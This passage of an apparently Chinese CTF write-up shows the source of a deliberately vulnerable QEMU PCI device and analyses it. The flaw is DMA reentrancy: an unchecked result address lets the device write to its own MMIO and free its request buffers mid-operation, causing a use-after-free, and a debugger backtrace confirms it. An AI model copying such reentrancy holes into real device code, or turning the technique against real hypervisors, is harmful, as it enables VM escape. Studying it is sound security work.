class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hw/misc/fun.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/osdep.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qapi/error.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/pci/pci.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/pci/msi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;exec/address-spaces.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;exec/memory.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_PCI_FUN <span class="string">&quot;fun&quot;</span></span></span><br><span class="line">OBJECT_DECLARE_SIMPLE_TYPE(FunState, PCI_FUN)</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FunReq</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> total_size;</span><br><span class="line">    <span class="type">void</span> *<span class="built_in">list</span>[<span class="number">127</span>];</span><br><span class="line">&#125; FunReq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FunState</span> &#123;</span></span><br><span class="line">    PCIDevice parent_obj;</span><br><span class="line"></span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line">    <span class="type">uint32_t</span> size;</span><br><span class="line">    <span class="type">uint32_t</span> idx;</span><br><span class="line">    <span class="type">uint32_t</span> result_addr;</span><br><span class="line"></span><br><span class="line">    FunReq *req;</span><br><span class="line">    AddressSpace *as;</span><br><span class="line">&#125; FunState;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------------------- helpers (DMA) ------------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">put_result</span><span class="params">(FunState *s, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> res = val;</span><br><span class="line">    address_space_write(s-&gt;as, (hwaddr)s-&gt;result_addr,</span><br><span class="line">                        MEMTXATTRS_UNSPECIFIED, &amp;res, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> FunReq *<span class="title function_">create_req</span><span class="params">(<span class="type">uint32_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">127</span> * <span class="number">0x400</span> - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FunReq *req = g_malloc(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">memset</span>(req, <span class="number">0</span>, <span class="keyword">sizeof</span>(FunReq));</span><br><span class="line"></span><br><span class="line">    req-&gt;total_size = size;</span><br><span class="line">    <span class="type">uint32_t</span> t = req-&gt;total_size / <span class="number">0x400</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; t &amp;&amp; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">        req-&gt;<span class="built_in">list</span>[i] = g_malloc(<span class="number">0x400</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> req;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete_req</span><span class="params">(FunReq *req)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> t = req-&gt;total_size / <span class="number">0x400</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; t; i++) &#123;</span><br><span class="line">        g_free(req-&gt;<span class="built_in">list</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    g_free(req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">handle_data_read</span><span class="params">(FunState *s, FunReq *req, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (req-&gt;total_size &amp;&amp; val &lt;= <span class="number">0x7E</span> &amp;&amp; val &lt; (req-&gt;total_size / <span class="number">0x400</span> + <span class="number">1</span>)) &#123;</span><br><span class="line">        put_result(s, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 从来宾物理内存读取 0x400 字节 -&gt; 写入 host 缓冲 req-&gt;list[val]</span></span><br><span class="line">        hwaddr pa = (hwaddr)(val * <span class="number">0x400</span>) + s-&gt;addr;</span><br><span class="line">        address_space_read(s-&gt;as, pa, MEMTXATTRS_UNSPECIFIED,</span><br><span class="line">                           req-&gt;<span class="built_in">list</span>[val], <span class="number">0x400</span>);</span><br><span class="line">        put_result(s, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">handle_data_write</span><span class="params">(FunState *s, FunReq *req, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (req-&gt;total_size &amp;&amp; val &lt;= <span class="number">0x7E</span> &amp;&amp; val &lt; (req-&gt;total_size / <span class="number">0x400</span> + <span class="number">1</span>)) &#123;</span><br><span class="line">        put_result(s, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 从 host 缓冲 req-&gt;list[val] 写 0x400 到来宾物理</span></span><br><span class="line">        hwaddr pa = (hwaddr)(val * <span class="number">0x400</span>) + s-&gt;addr;</span><br><span class="line">        address_space_write(s-&gt;as, pa, MEMTXATTRS_UNSPECIFIED,</span><br><span class="line">                            req-&gt;<span class="built_in">list</span>[val], <span class="number">0x400</span>);</span><br><span class="line">        put_result(s, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------------------- MMIO ops ------------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">fun_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    FunState *s = opaque;</span><br><span class="line">    <span class="type">uint32_t</span> val = (<span class="type">uint32_t</span>)<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x0</span>:</span><br><span class="line">        val = s-&gt;size;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x4</span>:</span><br><span class="line">        val = s-&gt;addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x8</span>:</span><br><span class="line">        val = s-&gt;result_addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">        val = s-&gt;idx;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;req) &#123;</span><br><span class="line">            handle_data_write(s, s-&gt;req, s-&gt;idx);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">fun_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    FunState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x0</span>:</span><br><span class="line">        s-&gt;size = (<span class="type">uint32_t</span>)val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x4</span>:</span><br><span class="line">        s-&gt;addr = (<span class="type">uint32_t</span>)val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x8</span>:</span><br><span class="line">        s-&gt;result_addr = (<span class="type">uint32_t</span>)val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">        s-&gt;idx = (<span class="type">uint32_t</span>)val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;req) &#123;</span><br><span class="line">            handle_data_read(s, s-&gt;req, s-&gt;idx);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">        <span class="keyword">if</span> (!s-&gt;req) &#123;</span><br><span class="line">            s-&gt;req = create_req(s-&gt;size);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;req) &#123;</span><br><span class="line">            delete_req(s-&gt;req);</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;req = <span class="literal">NULL</span>;</span><br><span class="line">        s-&gt;size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps fun_mmio_ops = &#123;</span><br><span class="line">    .read = fun_mmio_read,</span><br><span class="line">    .write = fun_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">    .valid = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------------------- PCI realize/uninit ------------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_fun_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    FunState *s = PCI_FUN(pdev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MSI 初始化</span></span><br><span class="line">    <span class="keyword">if</span> (!msi_init(pdev, <span class="number">0</span> <span class="comment">/*cap*/</span>, <span class="number">1</span> <span class="comment">/*vectors*/</span>, <span class="literal">true</span> <span class="comment">/*64bit*/</span>,</span><br><span class="line">                  <span class="literal">false</span> <span class="comment">/*per_vector_masking*/</span>, errp)) &#123;</span><br><span class="line">        s-&gt;addr = <span class="number">0</span>;</span><br><span class="line">        s-&gt;size = <span class="number">0</span>;</span><br><span class="line">        s-&gt;idx  = <span class="number">0</span>;</span><br><span class="line">        s-&gt;result_addr = <span class="number">0</span>;</span><br><span class="line">        s-&gt;req = <span class="literal">NULL</span>;</span><br><span class="line">        s-&gt;as = &amp;address_space_memory;</span><br><span class="line"></span><br><span class="line">        memory_region_init_io(&amp;s-&gt;mmio, OBJECT(s), &amp;fun_mmio_ops, s,</span><br><span class="line">                              <span class="string">&quot;fun-mmio&quot;</span>, <span class="number">0x1000</span>);</span><br><span class="line">        pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;mmio);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_fun_uninit</span><span class="params">(PCIDevice *pdev)</span></span><br><span class="line">&#123;</span><br><span class="line">    FunState *s = PCI_FUN(pdev);</span><br><span class="line"></span><br><span class="line">    delete_req(s-&gt;req);</span><br><span class="line">    s-&gt;addr = <span class="number">0</span>;</span><br><span class="line">    s-&gt;size = <span class="number">0</span>;</span><br><span class="line">    s-&gt;idx  = <span class="number">0</span>;</span><br><span class="line">    s-&gt;result_addr = <span class="number">0</span>;</span><br><span class="line">    s-&gt;req  = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    msi_uninit(pdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------------------- type/class boilerplate ------------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">fun_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_fun_realize;</span><br><span class="line">    k-&gt;<span class="built_in">exit</span>    = pci_fun_uninit;</span><br><span class="line"></span><br><span class="line">    k-&gt;vendor_id = <span class="number">0xCAFE</span>;</span><br><span class="line">    k-&gt;device_id = <span class="number">0xBABE</span>;</span><br><span class="line">    k-&gt;revision  = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id  = PCI_CLASS_OTHERS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分类标记（可选）</span></span><br><span class="line">    device_categorizable_set_bit(dc, DEVICE_CATEGORY_MISC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo fun_info = &#123;</span><br><span class="line">    .name          = TYPE_PCI_FUN,</span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(FunState),</span><br><span class="line">    .class_init    = fun_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_fun_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    type_register_static(&amp;fun_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type_init(pci_fun_register_types);</span><br></pre></td></tr></table></figure></div>

<p>设备的各个功能号含义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">FUN_OPT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SIZE = <span class="number">0x00</span>,</span><br><span class="line">    ADDR = <span class="number">0x04</span>,</span><br><span class="line">    RESULT_ADDR = <span class="number">0x08</span>,</span><br><span class="line">    INDEX = <span class="number">0x0C</span>,</span><br><span class="line">    HANDLE_DATA = <span class="number">0x10</span>,</span><br><span class="line">    CREATE_REQ = <span class="number">0x14</span>,</span><br><span class="line">    DELETE_REQ = <span class="number">0x18</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>0x00 SIZE</code>：设置 <code>size</code>。</li>
<li><code>0x04 ADDR</code>：DMA 的基址（<strong>来宾物理地址</strong>），DMA 访问从这里起按块偏移。</li>
<li><code>0x08 RESULT_ADDR</code>：写回结果的地址（DMA 写 4 字节状态值）。</li>
<li><code>0x0C INDEX</code>：当前操作的分块索引（0..126）。</li>
<li><code>0x10 HANDLE_DATA</code>：<ul>
<li><strong>MMIO 读</strong>触发 <code>handle_data_write()</code>：DMA <strong>read</strong>（Guest→Host），把 <code>GPA = ADDR + IDX*0x400</code> 的 1KB 拷到 <code>req-&gt;list[IDX]</code>。</li>
<li><strong>MMIO 写</strong>触发 <code>handle_data_read()</code>：DMA <strong>write</strong>（Host→Guest），把 <code>req-&gt;list[IDX]</code> 的 1KB 写回到相同 GPA。</li>
<li>两条路径都会向 <code>RESULT_ADDR</code> 依次写 <code>1</code>（开始）再写 <code>2</code>（完成），供轮询。</li>
</ul>
</li>
<li><code>0x14 CREATE_REQ</code>：若 <code>req == NULL</code> 则创建 <code>req</code> 和 <code>(size / 0x400 + 1)</code> 个 0x400 的 chunk。</li>
<li><code>0x18 DELETE_REQ</code>：若 <code>req != NULL</code> 则释放所有 chunk 与 <code>req</code> 本体，并把 <code>req=NULL,size=0</code>。</li>
</ul>
<p>题目是漏洞点是：<strong>DMA 可重入导致自递归 + UAF&#x2F;堆破坏</strong>。</p>
<p>设备的 <code>fun_mmio_write</code> 和 <code>fun_mmio_read</code> 分别能够调用到 <code>handle_data_read</code> 和 <code>handle_data_write</code>。</p>
<ul>
<li><code>fun_mmio_write(0x10)</code> → <code>handle_data_read</code></li>
<li><code>fun_mmio_read(0x10)</code> → <code>handle_data_write</code></li>
</ul>
<p><code>handle_data_read</code> 和 <code>handle_data_write</code> 的作用分别是：</p>
<ul>
<li><p><code>handle_data_read</code>：从来宾物理内存读取 0x400 字节数据写入 host 缓冲 <code>req-&gt;list[val]</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">handle_data_read</span><span class="params">(FunState *s, FunReq *req, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (req-&gt;total_size &amp;&amp; val &lt;= <span class="number">0x7E</span> &amp;&amp; val &lt; (req-&gt;total_size / <span class="number">0x400</span> + <span class="number">1</span>)) &#123;</span><br><span class="line">        put_result(s, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 从来宾物理内存读取 0x400 字节 -&gt; 写入 host 缓冲 req-&gt;list[val]</span></span><br><span class="line">        hwaddr pa = (hwaddr)(val * <span class="number">0x400</span>) + s-&gt;addr;</span><br><span class="line">        address_space_read(s-&gt;as, pa, MEMTXATTRS_UNSPECIFIED,</span><br><span class="line">                           req-&gt;<span class="built_in">list</span>[val], <span class="number">0x400</span>);</span><br><span class="line">        put_result(s, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>handle_data_write</code>：从 host 缓冲 <code>req-&gt;list[val]</code> 写 0x400 字节数据到来宾物理内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">handle_data_write</span><span class="params">(FunState *s, FunReq *req, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (req-&gt;total_size &amp;&amp; val &lt;= <span class="number">0x7E</span> &amp;&amp; val &lt; (req-&gt;total_size / <span class="number">0x400</span> + <span class="number">1</span>)) &#123;</span><br><span class="line">        put_result(s, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 从 host 缓冲 req-&gt;list[val] 写 0x400 到来宾物理</span></span><br><span class="line">        hwaddr pa = (hwaddr)(val * <span class="number">0x400</span>) + s-&gt;addr;</span><br><span class="line">        address_space_write(s-&gt;as, pa, MEMTXATTRS_UNSPECIFIED,</span><br><span class="line">                            req-&gt;<span class="built_in">list</span>[val], <span class="number">0x400</span>);</span><br><span class="line">        put_result(s, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>由于我们可以获取用户态指定内存页对应的物理地址，因此这里宾物理内存的 0x400 字节数据是完全可控且已知的。</p>
<p>而除此之外 <code>handle_data_read</code> 和 <code>handle_data_write</code> 都会调用 <code>put_result</code> 来设置执行状态。</p>
<p><code>put_result</code> 会向 <code>s-&gt;result_addr</code> 指定的物理地址写入数据。而 <code>result_addr</code> 可以通过 <code>handle_data_write(0x04)</code> 设置，并且没有范围检查。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">put_result</span><span class="params">(FunState *s, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> res = val;</span><br><span class="line">    address_space_write(s-&gt;as, (hwaddr)s-&gt;result_addr,</span><br><span class="line">                        MEMTXATTRS_UNSPECIFIED, &amp;res, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这就意味着我们能够在读写来宾物理内存之前<strong>向任意物理地址写入数据</strong>。</p>
<p>如果我们事先设置的 <code>s-&gt;result_addr</code> 是 MMIO 的物理地址偏移 0x18 的位置，则会调用到 <code>fun_mmio_write</code> 进而调用到 <code>delete_req</code> 释放整个 <code>req</code>。</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>bt
#0  <font color="#C4A000">__GI___libc_free</font> (mem=0x7fffa8e10550) at <font color="#4E9A06">malloc.c</font>:3087
#1  <font color="#3465A4">0x0000555555a25caa</font> in <font color="#C4A000">delete_req</font> (req=0x7fffa90dcc00) at <font color="#4E9A06">../hw/misc/fun.c</font>:96
#2  <font color="#3465A4">0x0000555555a25ec9</font> in <font color="#C4A000">fun_mmio_write</font> (opaque=0x5555576a0390, addr=24, val=1, size=4) at <font color="#4E9A06">../hw/misc/fun.c</font>:162
#3  <font color="#3465A4">0x0000555555c08105</font> in <font color="#C4A000">memory_region_write_accessor</font> (mr=0x5555576a0c80, addr=24, value=0x7ffff504b9f8, size=4, shift=0, mask=4294967295, attrs=...) at <font color="#4E9A06">../softmmu/memory.c</font>:491
#4  <font color="#3465A4">0x0000555555c0833c</font> in <font color="#C4A000">access_with_adjusted_size</font> (addr=24, value=0x7ffff504b9f8, size=4, access_size_min=4, access_size_max=4, access_fn=0x555555c08018 &lt;memory_region_write_accessor&gt;, mr=0x5555576a0c80, attrs=...) at <font color="#4E9A06">../softmmu/memory.c</font>:552
#5  <font color="#3465A4">0x0000555555c0b3ef</font> in <font color="#C4A000">memory_region_dispatch_write</font> (mr=0x5555576a0c80, addr=24, data=1, op=MO_32, attrs=...) at <font color="#4E9A06">../softmmu/memory.c</font>:1501
#6  <font color="#3465A4">0x0000555555c238fe</font> in <font color="#C4A000">flatview_write_continue</font> (fv=0x7fffa8028640, addr=4273934360, attrs=..., ptr=0x7ffff504bc74, len=4, addr1=24, l=4, mr=0x5555576a0c80) at <font color="#4E9A06">../softmmu/physmem.c</font>:2759
#7  <font color="#3465A4">0x0000555555c23a47</font> in <font color="#C4A000">flatview_write</font> (fv=0x7fffa8028640, addr=4273934360, attrs=..., buf=0x7ffff504bc74, len=4) at <font color="#4E9A06">../softmmu/physmem.c</font>:2799
#8  <font color="#3465A4">0x0000555555c23dc3</font> in <font color="#C4A000">address_space_write</font> (as=0x55555667de00 &lt;address_space_memory&gt;, addr=4273934360, attrs=..., buf=0x7ffff504bc74, len=4) at <font color="#4E9A06">../softmmu/physmem.c</font>:2891
#9  <font color="#3465A4">0x0000555555c23e34</font> in <font color="#C4A000">address_space_rw</font> (as=0x55555667de00 &lt;address_space_memory&gt;, addr=4273934360, attrs=..., buf=0x7ffff504bc74, len=4, is_write=true) at <font color="#4E9A06">../softmmu/physmem.c</font>:2901
#10 <font color="#3465A4">0x0000555555a258d1</font> in <font color="#C4A000">dma_memory_rw_relaxed</font> (as=0x55555667de00 &lt;address_space_memory&gt;, addr=4273934360, buf=0x7ffff504bc74, len=4, dir=DMA_DIRECTION_FROM_DEVICE) at <font color="#4E9A06">/home/flyyy/Desktop/qemu-vul/qemu-5.2.0-rc4/include/sysemu/dma.h</font>:87
#11 <font color="#3465A4">0x0000555555a25926</font> in <font color="#C4A000">dma_memory_rw</font> (as=0x55555667de00 &lt;address_space_memory&gt;, addr=4273934360, buf=0x7ffff504bc74, len=4, dir=DMA_DIRECTION_FROM_DEVICE) at <font color="#4E9A06">/home/flyyy/Desktop/qemu-vul/qemu-5.2.0-rc4/include/sysemu/dma.h</font>:110
#12 <font color="#3465A4">0x0000555555a25996</font> in <font color="#C4A000">dma_memory_write</font> (as=0x55555667de00 &lt;address_space_memory&gt;, addr=4273934360, buf=0x7ffff504bc74, len=4) at <font color="#4E9A06">/home/flyyy/Desktop/qemu-vul/qemu-5.2.0-rc4/include/sysemu/dma.h</font>:122
#13 <font color="#3465A4">0x0000555555a25a94</font> in <font color="#C4A000">put_result</font> (fun=0x5555576a0390, val=1) at <font color="#4E9A06">../hw/misc/fun.c</font>:56
